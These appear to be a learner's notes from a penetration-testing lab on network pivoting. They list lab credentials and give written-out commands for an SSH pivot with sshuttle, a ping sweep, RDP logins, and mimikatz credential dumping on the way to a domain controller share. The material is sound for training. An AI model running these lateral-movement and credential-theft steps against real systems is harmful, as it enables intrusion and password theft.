## Objectives
---
- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.

# Initial Foothold - PwnShell - `10.129.229.129`
---
![[Pasted image 20250804061249.png]]
![[Pasted image 20250804061432.png]]
=> Username: `mlefay`
=> Password: `Plain Human work!`

# WebAdmin access with key
---
- `ssh webadmin@10.129.229.129 -i id_rsa`
- **Pivoting into internal network:**
	- `sshuttle 172.16.5.0/24 -r webadmin@10.129.229.129 --ssh-cmd "ssh -i id_rsa"`
	- ![[Pasted image 20250804062702.png]]
# Finding internal hosts
---
- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
- ![[Pasted image 20250804063329.png]]
- `172.16.5.15`, `172.16.5.35`
- 1st machine looks like **linux because of 64 ttl** and **2nd one looks like windows because of 128 ttl**
- ![[Pasted image 20250804063550.png]]

# 172.16.5.35 - PIVOT-SRV01.INLANEFREIGHT.LOCAL
---
- Use `xfreerdp3` to login as `mlefay` user:
	- `xfreerdp3 /v:172.16.5.35 /u:'mlefay' /p:'Plain Human work!'`
	- ![[Pasted image 20250804063938.png]]
	- ![[Pasted image 20250804064154.png]]
	- Another Network to hop into:
		- ![[Pasted image 20250804065119.png]]
- `25,35 (existing),45`
- `172.16.6.45` -> Nix, `172.16.6.25` -> Windows

# Finding More Passwords
----
- Upload mimikatz and `sekurlsa::logonPasswords`
- ![[Pasted image 20250805063541.png]]
- `vfrank` : `Imply wet Unmasked!`

# Connect to windows (`172.16.6.25`)
---
-  RDP with `vfrank` : `Imply wet Unmasked!`
- ![[Pasted image 20250805064309.png]]

# DC Share folder
---
- Enter `C:\` drive of DC was shared:
	- ![[Pasted image 20250805064845.png]]